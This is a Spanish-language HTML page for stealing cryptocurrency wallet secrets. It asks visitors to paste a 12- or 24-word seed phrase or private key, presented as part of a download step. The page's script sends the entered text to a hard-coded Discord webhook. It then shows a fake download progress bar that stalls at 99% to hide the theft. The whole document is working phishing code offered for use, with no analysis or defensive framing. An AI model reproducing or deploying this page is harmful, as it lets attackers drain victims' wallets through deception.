<!DOCTYPE html>
<html>
<head>
  <title>Enviar datos a Discord</title>
  <style>
    body {
      background-color: #F5F5F5;
      font-family: Arial, sans-serif;
    }

    .container {
      text-align: center;
      margin: 20px;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    .input-field {
      background-color: #E0F2F1;
      border: none;
      padding: 15px;
      margin-bottom: 20px;
      width: 100%;
      border-radius: 10px;
      font-size: 16px;
    }

    .button {
      background-color: #4FC3F7;
      border: none;
      color: #FFFFFF;
      padding: 15px 40px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 18px;
      margin-bottom: 20px;
      cursor: pointer;
      border-radius: 10px;
      transition: background-color 0.3s ease;
    }

    .button:hover {
      background-color: #29B6F6;
    }

    .loading-button {
      background-color: #90CAF9;
    }

    .loading-button:after {
      content: "";
      display: inline-block;
      width: 10px;
      height: 10px;
      margin-left: 10px;
      border-radius: 50%;
      border: 2px solid white;
      border-color: white transparent white transparent;
      animation: loading 1s infinite;
    }

    @keyframes loading {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    @media screen and (max-width: 400px) {
      .container {
        margin: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Coloca tu frase secreta de 12 o 24 palabras o pega tu privateKey</h2>
    <input type="text" id="input-text" class="input-field" placeholder="Ingresa el texto">
    <button id="download-button" class="button">Descargar</button>
  </div>

  <script>
    function sendDataToDiscord() {
      var text = document.getElementById("input-text").value;

      // Construir el objeto con los datos a enviar
      var data = {
        content: text
      };

      // Realizar la solicitud POST a través de fetch
      fetch('https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(function(response) {
        console.log("Los datos se enviaron correctamente a Discord.");
      })
      .catch(function(error) {
        console.error("Error en la solicitud:", error);
      });

      // Simulación de carga para animar el botón
      var button = document.getElementById("download-button");
      button.classList.add("loading-button");
      button.innerText = "Descargando... 0%";

      var progress = 1;
      var interval = setInterval(function() {
        progress++;
        button.innerText = "Descargando... " + progress + "%";

        if (progress === 99) {
          clearInterval(interval);
        }
      }, 100);
    }

    var downloadButton = document.getElementById("download-button");
    downloadButton.addEventListener("click", sendDataToDiscord);
  </script>
</body>
</html>
